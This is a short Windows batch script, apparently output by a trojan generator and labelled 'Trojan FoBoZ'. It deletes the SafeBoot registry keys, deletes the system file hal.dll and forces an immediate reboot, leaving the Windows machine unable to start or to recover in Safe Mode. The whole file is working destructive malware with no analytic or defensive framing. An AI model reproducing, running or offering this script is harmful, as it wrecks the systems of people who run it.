@echo off
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot\*.* /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /q
del %WinDir%\system32\hal.dll /q
msg * Trojan FoBoZ
shutdown -r -t 00 -c 1
rem Created by: Generator Death by upO [5.0]
rem http://x3-team.ru/
